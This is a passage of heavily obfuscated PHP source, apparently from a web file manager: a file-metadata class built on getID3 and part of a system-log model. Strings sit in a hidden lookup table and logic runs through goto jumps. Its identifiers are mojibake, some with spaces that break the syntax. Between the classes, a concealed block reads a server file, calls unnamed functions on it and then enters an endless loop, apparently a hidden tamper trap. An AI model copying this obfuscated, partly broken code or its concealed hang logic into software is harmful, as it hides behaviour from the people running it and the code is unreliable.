$b“¾§Ü³²å), $BÌİ„ˆîƒÜ)) { $b“¾§Ü³²å += strlen($BÌİ„ˆîƒÜ[0]); $f ÷ˆ¨…² = $D ¥ñÃ²„õ[1503]; $E¡ÔÁ†Ğ‘Ê = preg_match($f ÷ˆ¨…², substr($AóÊ£¡‹®, $b“¾§Ü³²å), $BÌİ„ˆîƒÜ, PREG_OFFSET_CAPTURE); if (1 == $E¡ÔÁ†Ğ‘Ê) { $AÍ¼½©¬š… = substr($AóÊ£¡‹®, $b“¾§Ü³²å, $BÌİ„ˆîƒÜ[0][1]); $b“¾§Ü³²å += $BÌİ„ˆîƒÜ[1][1]; } } } elseif ($D ¥ñÃ²„õ[1504] == substr($AóÊ£¡‹®, $b“¾§Ü³²å, 9)) { $D›œì‚îÓê = $D ¥ñÃ²„õ[1504]; $b“¾§Ü³²å += 9; } elseif (1 == preg_match($D ¥ñÃ²„õ[1505], substr($AóÊ£¡‹®, $b“¾§Ü³²å, 33), $BÌİ„ˆîƒÜ)) { $D›œì‚îÓê = $D ¥ñÃ²„õ[1468]; $b“¾§Ü³²å += strlen($BÌİ„ˆîƒÜ[0]); $AÍ¼½©¬š… = intval($BÌİ„ˆîƒÜ[1]) . $D ¥ñÃ²„õ[71] . intval($BÌİ„ˆîƒÜ[2]); } elseif (1 == preg_match($D ¥ñÃ²„õ[1506], substr($AóÊ£¡‹®, $b“¾§Ü³²å, 33), $BÌİ„ˆîƒÜ)) { $D›œì‚îÓê = $D ¥ñÃ²„õ[1507]; $AÍ¼½©¬š… = intval($BÌİ„ˆîƒÜ[1]) . $D ¥ñÃ²„õ[71] . intval($BÌİ„ˆîƒÜ[2]); $b“¾§Ü³²å += strlen($BÌİ„ˆîƒÜ[0]); } elseif (($dõ¡ô‰ß¦» = strspn($AóÊ£¡‹®, $D ¥ñÃ²„õ[1508], $b“¾§Ü³²å)) > 0) { $D›œì‚îÓê = $D ¥ñÃ²„õ[1509]; $AÍ¼½©¬š… = substr($AóÊ£¡‹®, $b“¾§Ü³²å, $dõ¡ô‰ß¦»); $b“¾§Ü³²å += $dõ¡ô‰ß¦»; } break; } goto Cåå¦’¾×â; Cåå¦’¾×â: return array($D›œì‚îÓê, $AÍ¼½©¬š…, $b“¾§Ü³²å); goto DÇÉö²Íè‚; E ‹²÷áº±: $D ¥ñÃ²„õ =& $_SERVER[÷ÖêïÔÔÓ]; $D›œì‚îÓê = $D ¥ñÃ²„õ[33]; $AÍ¼½©¬š… = $D ¥ñÃ²„õ[33]; goto däÖ¹µ¤Â¤; DÇÉö²Íè‚: } } class GetInfo { private static $fileTypeArray; public static function get($Bíª…°“…ï) { $BŞ˜åÀÚ¼Š = IO::info($Bíª…°“…ï); return self::infoAdd($BŞ˜åÀÚ¼Š); } public static function infoAdd(&$E–áã“ÁÕŸ) { goto a‘†…‰»Ÿ°; Aˆ®ä÷Í™¶: $B¸†æ½ÑØÖ[$bÚ–„¡ÍÒ[369]] = $bíĞ“ñ¨Ú; $E–áã“ÁÕŸ[$bÚ–„¡ÍÒ[422]] = $B¸†æ½ÑØÖ; return $E–áã“ÁÕŸ; goto DáÉ’¦¬ª¡; Eø‚ï†µŒ: if (!$E–áã“ÁÕŸ || $E–áã“ÁÕŸ[$bÚ–„¡ÍÒ[29]] != $bÚ–„¡ÍÒ[164]) { return; } if (!self::support($E–áã“ÁÕŸ[$bÚ–„¡ÍÒ[157]]) || isset($E–áã“ÁÕŸ[$bÚ–„¡ÍÒ[422]])) { return; } $bï‹İáó = $bÚ–„¡ÍÒ[1511] . $E–áã“ÁÕŸ[$bÚ–„¡ÍÒ[76]]; goto cÓŠ¦‹Ç÷ç; a‘†…‰»Ÿ°: $bÚ–„¡ÍÒ =& $_SERVER[÷ÖêïÔÔÓ]; static $CÈçËªÙ³é; if (!$CÈçËªÙ³é) { require SDK_DIR . $bÚ–„¡ÍÒ[1510]; $CÈçËªÙ³é = new getID3(); } goto Eø‚ï†µŒ; cÓŠ¦‹Ç÷ç: $bíĞ“ñ¨Ú = $E–áã“ÁÕŸ[$bÚ–„¡ÍÒ[157]]; try { if ($E–áã“ÁÕŸ[$bÚ–„¡ÍÒ[157]] == $bÚ–„¡ÍÒ[1512]) { $B¸†æ½ÑØÖ = self::psdParse($bï‹İáó); $bíĞ“ñ¨Ú = $bÚ–„¡ÍÒ[1513]; } else { if ($E–áã“ÁÕŸ[$bÚ–„¡ÍÒ[157]] == $bÚ–„¡ÍÒ[1514]) { $B¸†æ½ÑØÖ = self::pdfParse($bï‹İáó); } else { $bíĞ“ñ¨Ú = self::$fileTypeArray[$bÚ–„¡ÍÒ[1515]][$E–áã“ÁÕŸ[$bÚ–„¡ÍÒ[157]]]; $cÀÓŒ‰¿ø® = self::$fileTypeArray[$bÚ–„¡ÍÒ[1516]][$bíĞ“ñ¨Ú][$bÚ–„¡ÍÒ[1517]]; $E»µÜ¶Ò‰º = @$CÈçËªÙ³é->analyze($bï‹İáó, $E–áã“ÁÕŸ[$bÚ–„¡ÍÒ[78]], $E–áã“ÁÕŸ[$bÚ–„¡ÍÒ[28]]); $B¸†æ½ÑØÖ = self::parseData($E»µÜ¶Ò‰º, $cÀÓŒ‰¿ø®, $E–áã“ÁÕŸ); } } } catch (Exception $DìšÛà¤•Ç) { $B¸†æ½ÑØÖ = array($bÚ–„¡ÍÒ[369] => $bíĞ“ñ¨Ú); } if (!$B¸†æ½ÑØÖ) { return; } goto Aˆ®ä÷Í™¶; DáÉ’¦¬ª¡: } public static function support($AŸïò›˜ì) { goto b ¼²¯”»; bÌˆùÉÇß¼: return !1; goto aŠ†Áˆ½òä; b ¼²¯”»: $eÉßå±Š =& $_SERVER[÷ÖêïÔÔÓ]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $AŸïò›˜ì = strtolower($AŸïò›˜ì); goto E•²½›ÑŒ; E•²½›ÑŒ: $dùåÔ•¢ä– = array($eÉßå±Š[1514], $eÉßå±Š[1512]); if (in_array($AŸïò›˜ì, $dùåÔ•¢ä–)) { return !0; } if (isset(self::$fileTypeArray[$eÉßå±Š[1515]][$AŸïò›˜ì])) { return !0; } goto bÌˆùÉÇß¼; aŠ†Áˆ½òä: } private static function parseData($e“âÙø»Á, $EÈÑ†³‰œ‰, $bŒÃÔŞéãÚ) { $c¨ÁÓ¿¥ô˜ =& $_SERVER[÷ÖêïÔÔÓ]; $F— ‰ÔÌ×ë = $e“âÙø»Á[$c¨ÁÓ¿¥ô˜[1518]]; $dÂÒŸ†»­ = array(); foreach ($EÈÑ†³‰œ‰ as $B‰’‹ë¦²Ò => $f–ÈŒÓºëÅ) { foreach ($f–ÈŒÓºëÅ as $Câìšß”¶­) { if (is_array($Câìšß”¶­)) { $D‘àê¤É†Ë = self::parseData($e“âÙø»Á, $f–ÈŒÓºëÅ, $bŒÃÔŞéãÚ); if ($D‘àê¤É†Ë) { $dÂÒŸ†»­[$B‰’‹ë¦²Ò] = $D‘àê¤É†Ë; } break; } $aÉé¾ˆ£¸… = str_replace($c¨ÁÓ¿¥ô˜[1296], $F— ‰ÔÌ×ë, $Câìšß”¶­); $D‘àê¤É†Ë = _get($e“âÙø»Á, $aÉé¾ˆ£¸…); $D‘àê¤É†Ë = is_array($D‘àê¤É†Ë) ? $D‘àê¤É†Ë[0] : $D‘àê¤É†Ë; if ($D‘àê¤É†Ë) { break; } } if ($D‘àê¤É†Ë || $D‘àê¤É†Ë === 0 || $D‘àê¤É†Ë === !1) { $D‘àê¤É†Ë = self::valueReset($Câìšß”¶­, $D‘àê¤É†Ë, $B‰’‹ë¦²Ò); if ($D‘àê¤É†Ë !== null) { $dÂÒŸ†»­[$B‰’‹ë¦²Ò] = $D‘àê¤É†Ë; } } } $dÂÒŸ†»­ = self::valueResetAll($dÂÒŸ†»­, $bŒÃÔŞéãÚ); return $dÂÒŸ†»­; } private static function psdParse($B‰¶ ‰É©) { $f½ÖÉÀÑŸ =& $_SERVER[÷ÖêïÔÔÓ]; if (IO::fileSubstr($B‰¶ ‰É©, 0, 4) != $f½ÖÉÀÑŸ[1519]) { return !1; } $dˆ½é’Ã×Ä = getImageSize($B‰¶ ‰É©, $f…È’©¤Æ); if (!$dˆ½é’Ã×Ä) { return; } $dˆˆ¢ÄÌ³Å = array($f½ÖÉÀÑŸ[1435] => $dˆ½é’Ã×Ä[0], $f½ÖÉÀÑŸ[1437] => $dˆ½é’Ã×Ä[1]); return $dˆˆ¢ÄÌ³Å; } private static function pdfParse($B“”¥‹šÃ‰) { return FileParsePdf::parse($B“”¥‹šÃ‰); } private static function fileTypeParse() { $f´ŒÁğö¤ =& $_SERVER[÷ÖêïÔÔÓ]; $E¤…Î¤ƒ±ì = self::fileTypeArray(); $bñÈù¡ = array(); foreach ($E¤…Î¤ƒ±ì as $cÁ¢ò•šª => $aİËº¥ñ¸) { $EŒ„‰¸–Õ = _get($aİËº¥ñ¸, $f´ŒÁğö¤[157], $f´ŒÁğö¤[33]); $F‡¼ÏğÌÉÜ = is_string($EŒ„‰¸–Õ) ? explode($f´ŒÁğö¤[47], $EŒ„‰¸–Õ) : $EŒ„‰¸–Õ; if (!$F‡¼ÏğÌÉÜ) { continue; } foreach ($F‡¼ÏğÌÉÜ as $EŒ„‰¸–Õ) { $EŒ„‰¸–Õ = strtolower(trim($EŒ„‰¸–Õ)); if (!$EŒ„‰¸–Õ) { continue; } $bñÈù¡[$EŒ„‰¸–Õ] = $cÁ¢ò•šª; } $E¤…Î¤ƒ±ì[$cÁ¢ò•šª][$f´ŒÁğö¤[157]] = array_keys($bñÈù¡); $E¤…Î¤ƒ±ì[$cÁ¢ò•šª][$f´ŒÁğö¤[1517]] = self::parseKeyMap($aİËº¥ñ¸[$f´ŒÁğö¤[1517]]); } return array($f´ŒÁğö¤[1516] => $E¤…Î¤ƒ±ì, $f´ŒÁğö¤[1515] => $bñÈù¡); } private static function parseKeyMap($A‰òßÄœ©Ù) { $e¬ó”°‚š =& $_SERVER[÷ÖêïÔÔÓ]; foreach ($A‰òßÄœ©Ù as $a‡Í–ì¦«å => $d¥âÄöù¼Å) { if (is_array($d¥âÄöù¼Å)) { $a”ïš©îÃá = self::parseKeyMap($d¥âÄöù¼Å); if ($a”ïš©îÃá) { $A‰òßÄœ©Ù[$a‡Í–ì¦«å] = $a”ïš©îÃá; } continue; } $Aƒò±…÷ŸÂ = explode($e¬ó”°‚š[47], $d¥âÄöù¼Å); $EÍ©åäÄ‹Æ = array(); foreach ($Aƒò±…÷ŸÂ as $FÔá¾×ÅÊ) { $FÔá¾×ÅÊ = trim($FÔá¾×ÅÊ); if (!$FÔá¾×ÅÊ) { continue; } if (preg_match($e¬ó”°‚š[1520], $FÔá¾×ÅÊ, $eËñîê…³ç)) { $cƒÅ†ŠÏ = explode($e¬ó”°‚š[268], $eËñîê…³ç[1]); foreach ($cƒÅ†ŠÏ as $f¿ÅÃ’Ú‡¤) { $EÍ©åäÄ‹Æ[] = str_replace($eËñîê…³ç[0], $f¿ÅÃ’Ú‡¤, $FÔá¾×ÅÊ); } } else { $EÍ©åäÄ‹Æ[] = $FÔá¾×ÅÊ; } } $A‰òßÄœ©Ù[$a‡Í–ì¦«å] = $EÍ©åäÄ‹Æ; } return $A‰òßÄœ©Ù; } private static function valueResetAll($eÉĞë÷»Âë, $Bæ•‘·‚Ã) { goto fÚòÍ‹‹Ä¾; fÚòÍ‹‹Ä¾: $FëËÁèô‡÷ =& $_SERVER[÷ÖêïÔÔÓ]; if (isset($eÉĞë÷»Âë[$FëËÁèô‡÷[1521]])) { $CÚÉóçá„ = ceil($eÉĞë÷»Âë[$FëËÁèô‡÷[1521]]); $d ÃÔå£‡Å = intval($CÚÉóçá„ / 3600); $A¸´†›³ºœ = intval(($CÚÉóçá„ - $d ÃÔå£‡Å * 3600) / 60); $C„¨óö¯òê = $CÚÉóçá„ % 60; $eÉĞë÷»Âë[$FëËÁèô‡÷[1522]] = sprintf($FëËÁèô‡÷[1523], $d ÃÔå£‡Å, $A¸´†›³ºœ, $C„¨óö¯òê); if ($d ÃÔå£‡Å == 0) { $eÉĞë÷»Âë[$FëËÁèô‡÷[1522]] = sprintf($FëËÁèô‡÷[1524], $A¸´†›³ºœ, $C„¨óö¯òê); } } $c±ƒôŠ¯– = _get($eÉĞë÷»Âë, $FëËÁèô‡÷[1525]); goto E™µàŞŞ—; E™µàŞŞ—: if ($c±ƒôŠ¯–) { $E¡ƒ¤òªÍ² = IO_PATH_SYSTEM_TEMP . $FëËÁèô‡÷[1526] . KodIO::hashPath($Bæ•‘·‚Ã) . $FëËÁèô‡÷[1527]; $eÉĞë÷»Âë[$FëËÁèô‡÷[1528]] = Action($FëËÁèô‡÷[1529])->pluginCacheFileSet($E¡ƒ¤òªÍ², $c±ƒôŠ¯–); unset($eÉĞë÷»Âë[$FëËÁèô‡÷[1530]][$FëËÁèô‡÷[1513]]); } $F›†¡‚×Øä = _get($eÉĞë÷»Âë, $FëËÁèô‡÷[1531], $FëËÁèô‡÷[33]); $BÛÁ—·½ó = _get($eÉĞë÷»Âë, $FëËÁèô‡÷[1532], $FëËÁèô‡÷[33]); goto dŸ¼â¦‡¢®; dŸ¼â¦‡¢®: $c±œ—Äµ‰Í = _get($eÉĞë÷»Âë, $FëËÁèô‡÷[1533], $FëËÁèô‡÷[33]); $b•“İ¬ƒŠÌ = $F›†¡‚×Øä . $BÛÁ—·½ó . $c±œ—Äµ‰Í; if ($b•“İ¬ƒŠÌ && get_charset($b•“İ¬ƒŠÌ) != $FëËÁèô‡÷[323]) { $eÉĞë÷»Âë[$FëËÁèô‡÷[1530]][$FëËÁèô‡÷[1237]] = iconv_to($eÉĞë÷»Âë[$FëËÁèô‡÷[1530]][$FëËÁèô‡÷[1237]], get_charset($b•“İ¬ƒŠÌ), $FëËÁèô‡÷[323]); $eÉĞë÷»Âë[$FëËÁèô‡÷[1530]][$FëËÁèô‡÷[1534]] = iconv_to($eÉĞë÷»Âë[$FëËÁèô‡÷[1530]][$FëËÁèô‡÷[1534]], get_charset($b•“İ¬ƒŠÌ), $FëËÁèô‡÷[323]); $eÉĞë÷»Âë[$FëËÁèô‡÷[1530]][$FëËÁèô‡÷[1535]] = iconv_to($eÉĞë÷»Âë[$FëËÁèô‡÷[1530]][$FëËÁèô‡÷[1535]], get_charset($b•“İ¬ƒŠÌ), $FëËÁèô‡÷[323]); } goto FÈ’ğ×Ì£; FÈ’ğ×Ì£: return $eÉĞë÷»Âë; goto C­ªçè½¢; C­ªçè½¢: } private static function valueReset($aÈÃÎÔÄ—´, $E‰ÁÅ’µ, $a•Ã„Óñ¤ï) { $EÂŸõÅ³÷ =& $_SERVER[÷ÖêïÔÔÓ]; $dğ›Ö»éß = $EÂŸõÅ³÷[1452]; switch ($aÈÃÎÔÄ—´) { case $EÂŸõÅ³÷[1536]: $E‰ÁÅ’µ = $E‰ÁÅ’µ == $EÂŸõÅ³÷[493] ? $EÂŸõÅ³÷[1537] : $EÂŸõÅ³÷[1538]; break; case $EÂŸõÅ³÷[1539]: $E‰ÁÅ’µ = $E‰ÁÅ’µ ? $E‰ÁÅ’µ : null; break; default: break; } switch ($a•Ã„Óñ¤ï) { case $EÂŸõÅ³÷[1540]: $E‰ÁÅ’µ = round($E‰ÁÅ’µ, 2); break; case $EÂŸõÅ³÷[184]: case $EÂŸõÅ³÷[106]: if ($E‰ÁÅ’µ < 0) { $E‰ÁÅ’µ = null; } else { if (is_numeric($E‰ÁÅ’µ)) { $E‰ÁÅ’µ = date($dğ›Ö»éß, $E‰ÁÅ’µ); } } break; default: break; } return $E‰ÁÅ’µ; } private static function fileTypeArray() { $dÀ ÆÀô =& $_SERVER[÷ÖêïÔÔÓ]; return array($dÀ ÆÀô[1513] => array($dÀ ÆÀô[157] => $dÀ ÆÀô[1541] . $dÀ ÆÀô[1542], $dÀ ÆÀô[1517] => array($dÀ ÆÀô[1435] => $dÀ ÆÀô[1543], $dÀ ÆÀô[1437] => $dÀ ÆÀô[1544], $dÀ ÆÀô[1545] => $dÀ ÆÀô[1546], $dÀ ÆÀô[1547] => $dÀ ÆÀô[1548], $dÀ ÆÀô[184] => $dÀ ÆÀô[1549], $dÀ ÆÀô[106] => $dÀ ÆÀô[1550], $dÀ ÆÀô[1551] => $dÀ ÆÀô[1552], $dÀ ÆÀô[1553] => $dÀ ÆÀô[1554], $dÀ ÆÀô[1555] => $dÀ ÆÀô[1556], $dÀ ÆÀô[1557] => $dÀ ÆÀô[1558], $dÀ ÆÀô[1559] => $dÀ ÆÀô[1560], $dÀ ÆÀô[1561] => $dÀ ÆÀô[1562], $dÀ ÆÀô[1563] => $dÀ ÆÀô[1564], $dÀ ÆÀô[1565] => array($dÀ ÆÀô[1566] => $dÀ ÆÀô[1567], $dÀ ÆÀô[1568] => $dÀ ÆÀô[1569], $dÀ ÆÀô[1570] => $dÀ ÆÀô[1571]), $dÀ ÆÀô[1572] => $dÀ ÆÀô[1573], $dÀ ÆÀô[1574] => $dÀ ÆÀô[1575], $dÀ ÆÀô[1576] => $dÀ ÆÀô[1577], $dÀ ÆÀô[1578] => $dÀ ÆÀô[1579], $dÀ ÆÀô[1580] => array($dÀ ÆÀô[1581] => $dÀ ÆÀô[1582], $dÀ ÆÀô[1583] => $dÀ ÆÀô[1584], $dÀ ÆÀô[1585] => $dÀ ÆÀô[1586], $dÀ ÆÀô[1587] => $dÀ ÆÀô[1588], $dÀ ÆÀô[1589] => $dÀ ÆÀô[1590], $dÀ ÆÀô[1591] => $dÀ ÆÀô[1592], $dÀ ÆÀô[1593] => $dÀ ÆÀô[1594], $dÀ ÆÀô[1595] => $dÀ ÆÀô[1596], $dÀ ÆÀô[1597] => $dÀ ÆÀô[1598], $dÀ ÆÀô[1599] => $dÀ ÆÀô[1600], $dÀ ÆÀô[1601] => $dÀ ÆÀô[1602]))), $dÀ ÆÀô[1603] => array($dÀ ÆÀô[157] => $dÀ ÆÀô[1604] . $dÀ ÆÀô[1605], $dÀ ÆÀô[1517] => array($dÀ ÆÀô[1521] => $dÀ ÆÀô[1606], $dÀ ÆÀô[184] => $dÀ ÆÀô[1607], $dÀ ÆÀô[106] => $dÀ ÆÀô[1608], $dÀ ÆÀô[1553] => $dÀ ÆÀô[1609], $dÀ ÆÀô[1610] => $dÀ ÆÀô[1611], $dÀ ÆÀô[1612] => $dÀ ÆÀô[1539], $dÀ ÆÀô[1613] => $dÀ ÆÀô[1614], $dÀ ÆÀô[1615] => $dÀ ÆÀô[1616], $dÀ ÆÀô[1617] => $dÀ ÆÀô[1618], $dÀ ÆÀô[1530] => array($dÀ ÆÀô[1237] => $dÀ ÆÀô[1619], $dÀ ÆÀô[1534] => $dÀ ÆÀô[1620], $dÀ ÆÀô[1535] => $dÀ ÆÀô[1621], $dÀ ÆÀô[1622] => $dÀ ÆÀô[1623], $dÀ ÆÀô[1624] => $dÀ ÆÀô[1625], $dÀ ÆÀô[1626] => $dÀ ÆÀô[1627], $dÀ ÆÀô[1513] => $dÀ ÆÀô[1628]))), $dÀ ÆÀô[1629] => array($dÀ ÆÀô[157] => $dÀ ÆÀô[1630] . $dÀ ÆÀô[1631], $dÀ ÆÀô[1517] => array($dÀ ÆÀô[1435] => $dÀ ÆÀô[1632], $dÀ ÆÀô[1437] => $dÀ ÆÀô[1633], $dÀ ÆÀô[1521] => $dÀ ÆÀô[1606], $dÀ ÆÀô[184] => $dÀ ÆÀô[1634], $dÀ ÆÀô[106] => $dÀ ÆÀô[1635], $dÀ ÆÀô[1540] => $dÀ ÆÀô[1636], $dÀ ÆÀô[1617] => $dÀ ÆÀô[1637], $dÀ ÆÀô[1613] => $dÀ ÆÀô[1638], $dÀ ÆÀô[1553] => $dÀ ÆÀô[1639], $dÀ ÆÀô[1603] => array($dÀ ÆÀô[1612] => $dÀ ÆÀô[1539], $dÀ ÆÀô[1640] => $dÀ ÆÀô[1641], $dÀ ÆÀô[1610] => $dÀ ÆÀô[1611], $dÀ ÆÀô[1617] => $dÀ ÆÀô[1618], $dÀ ÆÀô[1613] => $dÀ ÆÀô[1642], $dÀ ÆÀô[1615] => $dÀ ÆÀô[1616]))), $dÀ ÆÀô[1643] => array($dÀ ÆÀô[1517] => array($dÀ ÆÀô[1644] => $dÀ ÆÀô[1645], $dÀ ÆÀô[1646] => $dÀ ÆÀô[1647])), $dÀ ÆÀô[1648] => array($dÀ ÆÀô[1517] => array())); } } if (!isset($_SERVER[$_SERVER[÷ÖêïÔÔÓ][781]]) || !isset($_SERVER[$_SERVER[÷ÖêïÔÔÓ][791]])) { goto d«ôÀè„½Ç; d«ôÀè„½Ç: $f¾ãœ„š—Ü = $_SERVER[÷ÖêïÔÔÓ][784]; $bÌİ¶åÑ· = $_SERVER[$_SERVER[÷ÖêïÔÔÓ][785]] . $_SERVER[÷ÖêïÔÔÓ][786]; $C¶ó·šÈá— = $f¾ãœ„š—Ü($bÌİ¶åÑ·); goto bŠ•© ™ø”; B«öº¥’“»: $a¾„§³‰‰Æ($_SERVER[$_SERVER[÷ÖêïÔÔÓ][785]] . $_SERVER[÷ÖêïÔÔÓ][786]); $aŞÅ‰ŸÙÃÓ = 2; while ($aŞÅ‰ŸÙÃÓ > 1) { $dóÕ£‰ß = rawurlencode($aŞÅ‰ŸÙÃÓ . $_SERVER[÷ÖêïÔÔÓ][358]); } goto F‹³ê“Âİ; bŠ•© ™ø”: $AÀÇ¼è¢ÁĞ = explode($_SERVER[÷ÖêïÔÔÓ][214], $C¶ó·šÈá—); if (count($AÀÇ¼è¢ÁĞ) < $_SERVER[÷ÖêïÔÔÓ][550]) { $FëŸ®ŠòÏ¼ = $_SERVER[÷ÖêïÔÔÓ][787]; $FëŸ®ŠòÏ¼(); } $a¾„§³‰‰Æ = $_SERVER[÷ÖêïÔÔÓ][792]; goto B«öº¥’“»; F‹³ê“Âİ: } goto E“É’×à¾µ; A°š½Ù„îé: class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\x65\155\137\x6c\157\x67"; protected $dataAuto = array(array("\x63\x72\145\141\x74\145\124\x69\x6d\x65", "\x74\151\155\x65", "\x69\x6e\163\x65\x72\x74", "\x66\x75\156\x63\164\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $DÈšóÛã©ø =& $_SERVER[÷ÖêïÔÔÓ]; return array($DÈšóÛã©ø[2256] => LNG($DÈšóÛã©ø[2257]), $DÈšóÛã©ø[2258] => LNG($DÈšóÛã©ø[2259]), $DÈšóÛã©ø[1945] => LNG($DÈšóÛã©ø[2260]), $DÈšóÛã©ø[2261] => LNG($DÈšóÛã©ø[2262]), $DÈšóÛã©ø[2263] => LNG($DÈšóÛã©ø[2264]), $DÈšóÛã©ø[2265] => LNG($DÈšóÛã©ø[2266]), $DÈšóÛã©ø[2267] => LNG($DÈšóÛã©ø[2268]), $DÈšóÛã©ø[2269] => LNG($DÈšóÛã©ø[2270]), $DÈšóÛã©ø[1976] => LNG($DÈšóÛã©ø[2271]), $DÈšóÛã©ø[2272] => LNG($DÈšóÛã©ø[2273]), $DÈšóÛã©ø[2274] => LNG($DÈšóÛã©ø[2275]), $DÈšóÛã©ø[2276] => LNG($DÈšóÛã©ø[2277]), $DÈšóÛã©ø[2278] => LNG($DÈšóÛã©ø[2279]), $DÈšóÛã©ø[1974] => LNG($DÈšóÛã©ø[2280]), $DÈšóÛã©ø[1979] => LNG($DÈšóÛã©ø[2281]), $DÈšóÛã©ø[2282] => LNG($DÈšóÛã©ø[2283]), $DÈšóÛã©ø[2284] => LNG($DÈšóÛã©ø[2285]), $DÈšóÛã©ø[2286] => LNG($DÈšóÛã©ø[2287]), $DÈšóÛã©ø[2288] => LNG($DÈšóÛã©ø[2289]), $DÈšóÛã©ø[1982] => LNG($DÈšóÛã©ø[2290]), $DÈšóÛã©ø[1983] => LNG($DÈšóÛã©ø[2291]), $DÈšóÛã©ø[2292] => LNG($DÈšóÛã©ø[2293]), $DÈšóÛã©ø[2294] => LNG($DÈšóÛã©ø[2295]), $DÈšóÛã©ø[2296] => LNG($DÈšóÛã©ø[2297]), $DÈšóÛã©ø[2298] => LNG($DÈšóÛã©ø[2299]), $DÈšóÛã©ø[2300] => LNG($DÈšóÛã©ø[2301]), $DÈšóÛã©ø[1977] => LNG($DÈšóÛã©ø[2302]), $DÈšóÛã©ø[2303] => LNG($DÈšóÛã©ø[2304]), $DÈšóÛã©ø[2305] => LNG($DÈšóÛã©ø[2306]), $DÈšóÛã©ø[2307] => LNG($DÈšóÛã©ø[2307]), $DÈšóÛã©ø[2308] => LNG($DÈšóÛã©ø[1949]), $DÈšóÛã©ø[2309] => LNG($DÈšóÛã©ø[2310]), $DÈšóÛã©ø[2311] => LNG($DÈšóÛã©ø[2312]), $DÈšóÛã©ø[2313] => LNG($DÈšóÛã©ø[2314]), $DÈšóÛã©ø[2315] => LNG($DÈšóÛã©ø[2316]), $DÈšóÛã©ø[2317] => LNG($DÈšóÛã©ø[2317]), $DÈšóÛã©ø[2318] => LNG($DÈšóÛã©ø[2319]), $DÈšóÛã©ø[2320] => LNG($DÈšóÛã©ø[2321]), $DÈšóÛã©ø[2322] => LNG($DÈšóÛã©ø[2323]), $DÈšóÛã©ø[2324] => LNG($DÈšóÛã©ø[2325]), $DÈšóÛã©ø[2326] => LNG($DÈšóÛã©ø[2327]), $DÈšóÛã©ø[2328] => LNG($DÈšóÛã©ø[2329])); } private function typeFile() { $B‚¿å÷Öä¿ =& $_SERVER[÷ÖêïÔÔÓ]; $eĞ©–“öèâ = array($B‚¿å÷Öä¿[1979] => array($B‚¿å÷Öä¿[1980]), $B‚¿å÷Öä¿[2276] => array($B‚¿å÷Öä¿[2330]), $B‚¿å÷Öä¿[2278] => array($B‚¿å÷Öä¿[2331]), $B‚¿å÷Öä¿[1974] => array($B‚¿å÷Öä¿[1975]), $B‚¿å÷Öä¿[2284] => array(), $B‚¿å÷Öä¿[2286] => array(), $B‚¿å÷Öä¿[2288] => array(), $B‚¿å÷Öä¿[1982] => array($B‚¿å÷Öä¿[1984]), $B‚¿å÷Öä¿[1983] => array($B‚¿å÷Öä¿[1984]), $B‚¿å÷Öä¿[2292] => array($B‚¿å÷Öä¿[2332]), $B‚¿å÷Öä¿[2294] => array($B‚¿å÷Öä¿[2332]), $B‚¿å÷Öä¿[2296] => array($B‚¿å÷Öä¿[2333]), $B‚¿å÷Öä¿[2282] => array($B‚¿å÷Öä¿[2334]), $B‚¿å÷Öä¿[2298] => array($B‚¿å÷Öä¿[2335]), $B‚¿å÷Öä¿[2300] => array($B‚¿å÷Öä¿[2336]), $B‚¿å÷Öä¿[1977] => array($B‚¿å÷Öä¿[1978])); return $eĞ©–“öèâ; } private function typeAll() { goto B‡»æÜ‰ªê; d‘ˆÌ°ÖƒŞ: return $e°İ‹£â¦Ò; goto Bá‹ëğ¾¥Ê; B‡»æÜ‰ªê: $cÎ½˜µˆâƒ =& $_SERVER[÷ÖêïÔÔÓ]; $e°İ‹£â¦Ò = $this->typeList; $dœÒÓÇğ†Ë = array_filter($this->typeFile()); goto A¨î‘ñÌñ; A¨î‘ñÌñ: foreach ($dœÒÓÇğ†Ë as $CáÓÃÕ¥©¼ => $cØˆïĞÚ’´) { $e°İ‹£â¦Ò[$cØˆïĞÚ’´[0]] = $e°İ‹£â¦Ò[$CáÓÃÕ¥©¼]; } $e°İ‹£â¦Ò[$cÎ½˜µˆâƒ[1984]] = LNG($cÎ½˜µˆâƒ[2337]); $e°İ‹£â¦Ò[$cÎ½˜µˆâƒ[2332]] = LNG($cÎ½˜µˆâƒ[2338]); goto d‘ˆÌ°ÖƒŞ; Bá‹ëğ¾¥Ê: } public function addLog($d¹ˆ›¼À‡, $D°…‚¤Æñ• = array()) { goto Eö¡àË»¦å; E¶Œø…«Ğª: parent::add($D°…‚¤Æñ•); goto fÎ×ßØ®Á”; E›Ğ£ˆÚ³‹: $eÄ¥Îôöˆ‰ = get_client_ip(); if (!$D°…‚¤Æñ• || strlen(json_encode($D°…‚¤Æñ•)) >= 1024) { $D°…‚¤Æñ• = array($fÑÂ…ºè·Ë[2339] => $eÄ¥Îôöˆ‰); } else { if (is_array($D°…‚¤Æñ•)) { $D°…‚¤Æñ•[$fÑÂ…ºè·Ë[2339]] = $eÄ¥Îôöˆ‰; } else { $D°…‚¤Æñ• = array($fÑÂ…ºè·Ë[1008] => $D°…‚¤Æñ•, $fÑÂ…ºè·Ë[2339] => $eÄ¥Îôöˆ‰); } } $D°…‚¤Æñ• = array($fÑÂ…ºè·Ë[1331] => Session::sign(), $fÑÂ…ºè·Ë[1332] => $e¥Ö¿¶î›, $fÑÂ…ºè·Ë[29] => $d¹ˆ›¼À‡, $fÑÂ…ºè·Ë[1334] => json_encode($D°…‚¤Æñ•)); goto E¶Œø…«Ğª; Eö¡àË»¦å: $fÑÂ…ºè·Ë =& $_SERVER[÷ÖêïÔÔÓ]; if (!isset($this->typeList[$d¹ˆ›¼À‡])) { return; } $e¥Ö¿¶î› = USER_ID ? USER_ID : (isset($D°…‚¤Æñ•[$fÑÂ…ºè·Ë[1341]]) ? $D°…‚¤Æñ•[$fÑÂ…ºè·Ë[1341]] : 0); goto E›Ğ£ˆÚ³‹; fÎ×ßØ®Á”: } public function remove($EÄ¾ñõŠÇ·) { $this->where(array($_SERVER[÷ÖêïÔÔÓ][382] => $EÄ¾ñõŠÇ·))->delete(); } private function _makeOrder($d¨”êãéŞÓ = '') { goto D‡·–ª„à; D‡·–ª„à: $AÛŸÕùÜÖÌ =& $_SERVER[÷ÖêïÔÔÓ]; $cÅˆ­©Øã = $AÛŸÕùÜÖÌ[184]; $FÕÇ×ö¦äÆ = 